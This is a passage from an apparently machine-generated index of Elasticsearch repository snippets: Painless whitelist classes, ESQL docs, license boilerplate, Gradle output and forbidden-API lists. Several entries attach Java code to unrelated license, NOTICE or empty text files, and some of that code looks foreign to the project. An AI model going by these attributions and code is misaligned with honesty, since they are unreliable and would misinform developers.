java.util.concurrent.ThreadFactory, java.util.concurrent.RejectedExecutionHandler)\n```\n\n----------------------------------------\n\nTITLE: ByteBuffer Class Definition\nDESCRIPTION: Defines the ByteBuffer class with methods for buffer conversion, getting values, and wrapping byte arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.nio.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.nio.ByteBuffer {\n  CharBuffer asCharBuffer()\n  DoubleBuffer asDoubleBuffer()\n  FloatBuffer asFloatBuffer()\n  IntBuffer asIntBuffer()\n  LongBuffer asLongBuffer()\n  ShortBuffer asShortBuffer()\n  byte get(int)\n  char getChar(int)\n  double getDouble(int)\n  float getFloat(int)\n  int getInt(int)\n  long getLong(int)\n  short getShort(int)\n  ByteOrder order()\n  ByteBuffer order(ByteOrder)\n  ByteBuffer wrap(byte[])\n  ByteBuffer wrap(byte[], int, int)\n}\n```\n\n----------------------------------------\n\nTITLE: Description for Right String Function\nDESCRIPTION: Documentation block explaining the right string extraction function that takes a string and length parameter to return a substring from the right side.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/right.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturn the substring that extracts *length* chars from *str* starting from the right.\n```\n\n----------------------------------------\n\nTITLE: Defining Bitwise OR Grammar in Painless\nDESCRIPTION: Grammar specification for the bitwise OR operator in Painless language syntax. This defines how the OR expression is structured in code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_35\n\nLANGUAGE: text\nCODE:\n```\nbitwise_or: expression '|' expression;\n```\n\n----------------------------------------\n\nTITLE: Warning Block for CATEGORIZE Function in Markdown\nDESCRIPTION: A warning message in Markdown format, indicating that the CATEGORIZE function is in technical preview and should not be used in production environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/categorize.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{warning}\nDo not use on production environments. This functionality is in technical preview and\nmay be changed or removed in a future release. Elastic will work to fix any issues, but features in technical preview\nare not subject to the support SLA of official GA features.\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining UnsupportedOperationException in Java\nDESCRIPTION: This snippet defines the java.lang.UnsupportedOperationException class, thrown to indicate that the requested operation is not supported. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_51\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.UnsupportedOperationException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Prohibited Network Connection Methods\nDESCRIPTION: Lists network connection methods that should not be used directly in Elasticsearch code, preventing uncontrolled socket connections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage Don't open socket connections\njava.net.URL#openStream()\njava.net.URLConnection#connect()\njava.net.URLConnection#getInputStream()\njava.net.Socket#connect(java.net.SocketAddress)\njava.net.Socket#connect(java.net.SocketAddress, int)\njava.nio.channels.SocketChannel#open(java.net.SocketAddress)\njava.nio.channels.SocketChannel#connect(java.net.SocketAddress)\n```\n\n----------------------------------------\n\nTITLE: Preventing Wildcard Address Binding\nDESCRIPTION: Forbids constructors that might bind to wildcard addresses, requiring more specific address binding.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_7\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Don't bind to wildcard addresses. Be specific.\njava.net.DatagramSocket#<init>()\njava.net.DatagramSocket#<init>(int)\njava.net.InetSocketAddress#<init>(int)\njava.net.MulticastSocket#<init>()\njava.net.MulticastSocket#<init>(int)\njava.net.ServerSocket#<init>(int)\njava.net.ServerSocket#<init>(int,int)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Indices from Elasticsearch Bulk Request\nDESCRIPTION: Implementation of the CompositeIndicesRequest interface method to get all indices referenced in the bulk request, used for permission checks and routing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic Set<String> indices() {\n    Set<String> indices = new HashSet<>();\n    for (DocWriteRequest<?> request : requests) {\n        indices.add(request.index());\n    }\n    return indices;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Repeat String Function Test Case\nDESCRIPTION: This LaTeX-style comment defines the purpose of the file, indicating it's a generated test case for ESQL's repeat string function. It warns against manual editing and provides instructions for regeneration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/repeat.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Restricting InetAddress.getLocalHost() Usage\nDESCRIPTION: Prohibits the use of getLocalHost() method due to potential issues in network configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Usage of getLocalHost is discouraged\njava.net.InetAddress#getLocalHost()\n```\n\n----------------------------------------\n\nTITLE: Brics Automaton Copyright Notice\nDESCRIPTION: Copyright and license notice for code derived from Brics automaton project used in Lucene's automaton package. Details BSD-style license terms and conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-nori/licenses/lucene-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright (c) 2001-2009 Anders Moeller\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n * \n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n```\n\n----------------------------------------\n\nTITLE: Configuring Flat Directory Repository for Custom Artifacts\nDESCRIPTION: Sets up a flat directory repository for custom JAR artifacts and demonstrates dependency declaration for local JARs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_10\n\nLANGUAGE: gradle\nCODE:\n```\nallprojects {\n  repositories {\n      flatDir {\n          dirs 'localRepo'\n      }\n  }\n}\n```\n\nLANGUAGE: gradle\nCODE:\n```\ndependencies {\n      implementation 'x:jmxri:1.2.1'\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GeoShapeDocValuesField Class in Java for Elasticsearch\nDESCRIPTION: This class is part of Elasticsearch's spatial functionality, specifically for handling GeoShape doc values. It provides two overloaded 'get' methods for retrieving GeoShapeValue objects, one with a single parameter and another with two parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/spatial/src/main/resources/org/elasticsearch/xpack/spatial/org.elasticsearch.xpack.spatial.index.mapper.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.xpack.spatial.index.mapper.GeoShapeWithDocValuesFieldMapper$GeoShapeDocValuesField {\n  GeoShapeValues.GeoShapeValue get(GeoShapeValues.GeoShapeValue)\n  GeoShapeValues.GeoShapeValue get(int, GeoShapeValues.GeoShapeValue)\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Absolute Value Function Description\nDESCRIPTION: Documentation comment indicating that this file is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually. Includes a brief description stating that the function returns the absolute value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/abs.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the absolute value.\n```\n\n----------------------------------------\n\nTITLE: Defining Java StrictMath Class Methods\nDESCRIPTION: This snippet outlines the available methods from the java.lang.StrictMath class for use in Painless scripting. It encompasses various mathematical operations like absolute value, trigonometric functions, logarithmic functions, power, rounding, and other utility functions. The `@nondeterministic` annotation indicates that `random()` method's result may vary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_19\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.StrictMath {\\n  double E\\n  double PI\\n  double abs(double)\\n  double acos(double)\\n  double asin(double)\\n  double atan(double)\\n  double atan2(double,double)\\n  double cbrt(double)\\n  double ceil(double)\\n  double copySign(double,double)\\n  double cos(double)\\n  double cosh(double)\\n  double exp(double)\\n  double expm1(double)\\n  double floor(double)\\n  double hypot(double,double)\\n  double IEEEremainder(double,double)\\n  double log(double)\\n  double log10(double)\\n  double log1p(double)\\n  double max(double,double)\\n  double min(double,double)\\n  double nextAfter(double,double)\\n  double nextDown(double)\\n  double nextUp(double)\\n  double pow(double,double)\\n  double random() @nondeterministic\\n  double rint(double)\\n  long round(double)\\n  double scalb(double,int)\\n  double signum(double)\\n  double sin(double)\\n  double sinh(double)\\n  double sqrt(double)\\n  double tan(double)\\n  double tanh(double)\\n  double toDegrees(double)\\n  double toRadians(double)\\n  double ulp(double)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Handling field name with dot notation in DotExpandingXContentParser\nDESCRIPTION: This method converts field names containing dots (e.g., 'foo.bar') into nested object notation by creating a path structure when currentName() is called on the parser. It handles the special case where a field name begins with an underscore by preserving it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n@Override\npublic String currentName() throws IOException {\n    String name = super.currentName();\n    if (name != null && name.indexOf('.') > 0) {\n        // If the field name starts with '_', we're in a metadata field and we leave the name as is\n        if (name.charAt(0) == '_') {\n            return name;\n        }\n\n        String path = XContentMapValues.dotNestedField(name, this.path);\n        if (path != null) {\n            return path;\n        }\n    }\n    return name;\n}\n```\n\n----------------------------------------\n\nTITLE: HISTOGRAM Mathematical Formula in Elasticsearch SQL\nDESCRIPTION: Shows the mathematical formula used by the HISTOGRAM function to calculate bucket keys based on values and intervals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nbucket_key = Math.floor(value / interval) * interval\n```\n\n----------------------------------------\n\nTITLE: Defining Collectors Class in Painless - Java\nDESCRIPTION: Defines the Collectors utility class, providing implementations of various reduction operations, such as grouping, mapping, and joining, on stream elements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.Collectors {\n  Collector averagingDouble(ToDoubleFunction)\n  Collector averagingInt(ToIntFunction)\n  Collector averagingLong(ToLongFunction)\n  Collector collectingAndThen(Collector,Function)\n  Collector counting()\n  Collector groupingBy(Function)\n  Collector groupingBy(Function,Collector)\n  Collector groupingBy(Function,Supplier,Collector)\n  Collector joining()\n  Collector joining(CharSequence)\n  Collector joining(CharSequence,CharSequence,CharSequence)\n  Collector mapping(Function,Collector)\n  Collector maxBy(Comparator)\n  Collector minBy(Comparator)\n  Collector partitioningBy(Predicate)\n  Collector partitioningBy(Predicate,Collector)\n  Collector reducing(BinaryOperator)\n  Collector reducing(def,BinaryOperator)\n  Collector reducing(def,Function,BinaryOperator)\n  Collector summarizingDouble(ToDoubleFunction)\n  Collector summarizingInt(ToIntFunction)\n  Collector summarizingLong(ToLongFunction)\n  Collector summingDouble(ToDoubleFunction)\n  Collector summingInt(ToIntFunction)\n  Collector summingLong(ToLongFunction)\n  Collector toCollection(Supplier)\n  Collector toList()\n  Collector toMap(Function,Function)\n  Collector toMap(Function,Function,BinaryOperator)\n  Collector toMap(Function,Function,BinaryOperator,Supplier)\n  Collector toSet()\n}\n```\n\n----------------------------------------\n\nTITLE: Java Security Subject Method Reference\nDESCRIPTION: Method signature for Subject.doAsPrivileged() which executes a PrivilegedAction on behalf of a Subject with a specified AccessControlContext. Used for privileged operations in secure Java applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\njavax.security.auth.Subject#doAsPrivileged(javax.security.auth.Subject,java.security.PrivilegedAction,java.security.AccessControlContext)\n```\n\n----------------------------------------\n\nTITLE: Content Type Specification Rules for HTTP Entities\nDESCRIPTION: Lists HTTP entity constructors that require explicit ContentType specification. These constructors should be avoided as they don't enforce content type setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/http-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\norg.apache.http.entity.StringEntity#<init>(java.lang.String)\norg.apache.http.entity.StringEntity#<init>(java.lang.String,java.lang.String)\norg.apache.http.entity.StringEntity#<init>(java.lang.String,java.nio.charset.Charset)\norg.apache.http.entity.ByteArrayEntity#<init>(byte[])\norg.apache.http.entity.ByteArrayEntity#<init>(byte[],int,int)\norg.apache.http.entity.FileEntity#<init>(java.io.File)\norg.apache.http.entity.InputStreamEntity#<init>(java.io.InputStream)\norg.apache.http.entity.InputStreamEntity#<init>(java.io.InputStream,long)\norg.apache.http.nio.entity.NByteArrayEntity#<init>(byte[])\norg.apache.http.nio.entity.NByteArrayEntity#<init>(byte[],int,int)\norg.apache.http.nio.entity.NFileEntity#<init>(java.io.File)\norg.apache.http.nio.entity.NStringEntity#<init>(java.lang.String)\norg.apache.http.nio.entity.NStringEntity#<init>(java.lang.String,java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Defining ReflectiveOperationException in Java\nDESCRIPTION: This snippet defines the java.lang.ReflectiveOperationException class, the common superclass of reflection-related exceptions. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_47\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ReflectiveOperationException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Static Import for 'emit' Callback in Painless\nDESCRIPTION: This code defines a static import for the `emit` callback in Painless. The `emit` function is bound to `org.elasticsearch.script.StringFieldScript$Emit`, allowing Painless scripts to call `emit` to collect values for a string field. This provides a controlled way to expose the functionality of the emit callback within Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.keyword_field.txt#2025-04-21_snippet_2\n\nLANGUAGE: Painless\nCODE:\n```\n\"static_import {\n    # The `emit` callback to collect values for the field\n    void emit(org.elasticsearch.script.StringFieldScript, String) bound_to org.elasticsearch.script.StringFieldScript$Emit\n}\"\n```\n\n----------------------------------------\n\nTITLE: Defining ClassCastException in Java\nDESCRIPTION: This snippet defines the java.lang.ClassCastException class, thrown to indicate that the code has attempted to cast an object to a subclass of which it is not an instance. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_29\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ClassCastException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Elasticsearch Home Directory in Bash\nDESCRIPTION: Validates that the ES_HOME environment variable is set and points to a valid directory before executing certificate operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n[ -n \"$ES_HOME\" ] || { printf '%s: $ES_HOME is not set\\n' \"$0\" ; exit 1; }\n[ -d \"$ES_HOME\" ] || { printf '%s: $ES_HOME is not a directory\\n' \"$0\" ; exit 1; }\n```\n\n----------------------------------------\n\nTITLE: Gradle Configuration for Elasticsearch Metrics\nDESCRIPTION: This Groovy snippet configures the Elasticsearch Gradle project to enable telemetry and set the secret token and server URL for the APM agent.  It modifies the `testClusters` configuration, enabling the security audit, telemetry metrics, and setting the agent's server URL and secret token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/METERING.md#2025-04-21_snippet_3\n\nLANGUAGE: groovy\nCODE:\n```\nrootProject {\n    if (project.name == 'elasticsearch' && Boolean.getBoolean('metrics.enabled')) {\n        afterEvaluate {\n            testClusters.matching { it.name == \"runTask\" }.configureEach {\n                setting 'xpack.security.audit.enabled', 'true'\n                keystore 'telemetry.secret_token', 'TODO-REPLACE'\n                setting 'telemetry.metrics.enabled', 'true'\n                setting 'telemetry.agent.server_url', 'https://TODO-REPLACE-URL.apm.eastus2.staging.azure.foundit.no:443'\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Node.js with Homebrew for Azure CLI Tools\nDESCRIPTION: Command to install Node.js using Homebrew package manager on macOS, which is required for using Azure Command-Line Tools.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nbrew install node\n```\n\n----------------------------------------\n\nTITLE: Creating Immutable Task Parameters in Elasticsearch\nDESCRIPTION: Code demonstrating how to serialize and deserialize task parameters to create an immutable copy, preventing parameter modification after task creation. This pattern maintains consistency across node boundaries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/text-structure/licenses/super-csv-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nif (params instanceof ToXContent) {\n    // Make sure we don't modify parameters in place\n    try (XContentBuilder builder = MediaTypeRegistry.contentBuilder(MediaType.APPLICATION_JSON)) {\n        ((ToXContent) params).toXContent(builder, ToXContent.EMPTY_PARAMS);\n        try (XContentParser parser = MediaTypeRegistry.xContent(MediaType.APPLICATION_JSON).createParser(\n            NamedXContentRegistry.EMPTY, DeprecationHandler.THROW_UNSUPPORTED_OPERATION, builder.bytes().streamInput())) {\n            parser.nextToken();\n            params = paramsParser.apply(parser);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Shared Folder Path in Bash\nDESCRIPTION: Sets an environment variable for the shared data folder path.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nSHARED_FOLDER=/tmp/sharedESData\n```\n\n----------------------------------------\n\nTITLE: Example Notice for Using Database Content\nDESCRIPTION: This snippet provides an example notice to be included when publicly using content obtained from a database licensed under ODbL. It informs users about the source of the content and its availability under the Open Database License.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/spatial/src/test/resources/org/elasticsearch/xpack/spatial/index/fielddata/LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Plain Text\nCODE:\n```\nContains information from DATABASE NAME, which is made available\\nhere under the Open Database License (ODbL).\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides the boilerplate notice to be included when applying the Apache License 2.0 to a project. It includes placeholders for the copyright year and owner, as well as the full license text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/rest/licenses/commons-codec-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides the boilerplate notice to be included in your files when applying the Apache License 2.0.  Replace the bracketed fields with your own identifying information. Ensure that the text is enclosed in the appropriate comment syntax for the file format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/compute/gen/licenses/javapoet-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Distribution Tools Module\nDESCRIPTION: Evaluates the build file for the ':distribution:tools' project in the Elasticsearch codebase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_4\n\nLANGUAGE: gradle\nCODE:\n```\n> Configure project :distribution:tools\nEvaluating project ':distribution:tools' using build file '/Users/rene/dev/elastic/elasticsearch/distribution/tools/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Defining SignStyle Enum in Java\nDESCRIPTION: The SignStyle enum provides various options for how the sign of numeric values is displayed when formatting. Options include ALWAYS, NEVER, and NORMAL, which dictate whether positive and negative signs are shown or omitted based on the input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.SignStyle {\n  SignStyle ALWAYS\n  SignStyle EXCEEDS_PAD\n  SignStyle NEVER\n  SignStyle NORMAL\n  SignStyle NOT_NEGATIVE\n  SignStyle valueOf(String)\n  SignStyle[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Evaluating Snapshot Repo Test Kit Projects (File: build.gradle)\nDESCRIPTION: This snippet evaluates the various projects related to snapshot repository test kits, including Azure, GCS, HDFS, MinIO, and REST configurations. It ensures each plugin's specific QA build file is used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_8\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:azure\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:azure' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/azure/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:gcs\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:gcs' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/gcs/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:hdfs\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:hdfs' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/hdfs/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:minio\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:minio' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/minio/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:rest\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:rest' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/rest/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:snapshot-repo-test-kit:qa:s3\nEvaluating project ':x-pack:plugin:snapshot-repo-test-kit:qa:s3' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/snapshot-repo-test-kit/qa/s3/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Binding and Reverting with LDAPConnectionPool using String Credentials\nDESCRIPTION: This snippet highlights the binding process using a string username, password, and optional control parameters while leveraging an LDAPConnectionPool. It allows for dynamic authentication changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/ldap-signatures.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\ncom.unboundid.ldap.sdk.LDAPConnectionPool#bindAndRevertAuthentication(java.lang.String, java.lang.String, com.unboundid.ldap.sdk.Control[])\n```\n\n----------------------------------------\n\nTITLE: Defining InternalQlScriptUtils Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the InternalQlScriptUtils class with various utility methods, comparison operators, logical operators, and regex functions for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.ql.expression.function.scalar.whitelist.InternalQlScriptUtils {\n#\n# Utilities\n#\n  def docValue(java.util.Map, String)\n  boolean nullSafeFilter(Boolean)\n  double nullSafeSortNumeric(Number)\n  String nullSafeSortString(Object)\n\n#\n# ASCII Functions\n#\n  Boolean startsWith(String, String, Boolean)\n\n#\n# Comparison\n#\n  Boolean eq(Object, Object)\n  Boolean nulleq(Object, Object)\n  Boolean neq(Object, Object)\n  Boolean lt(Object, Object)\n  Boolean lte(Object, Object)\n  Boolean gt(Object, Object)\n  Boolean gte(Object, Object)\n  Boolean in(Object, java.util.List)\n\n#\n# Logical\n#\n  Boolean and(Boolean, Boolean)\n  Boolean or(Boolean, Boolean)\n  Boolean not(Boolean)\n  Boolean isNull(Object)\n  Boolean isNotNull(Object)\n\n#\n# Regex\n#\n  Boolean regex(String, String)\n  Boolean regex(String, String, Boolean)\n\n#\n# Math\n#\n  Number neg(Number)\n\n}\n```\n\n----------------------------------------\n\nTITLE: Copyright Notice and GPL Declaration\nDESCRIPTION: This snippet provides a template for attaching copyright notices and license declarations to the start of source files. It includes a copyright line, a statement declaring the program as free software under the GNU GPL, a warranty disclaimer, and information on obtaining a copy of the GPL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n\"    One line to give the program's name and a brief idea of what it does.\n    Copyright (C) <year> <name of author>\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful, but\n    WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n    General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program; if not, write to the Free Software\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\"\n```\n\n----------------------------------------\n\nTITLE: Running GraphQL Connector End-to-End Tests\nDESCRIPTION: This command runs functional tests against a real GraphQL data source using Docker Compose. It leverages the connector framework and does not require a running Elasticsearch instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n\"$ make ftest 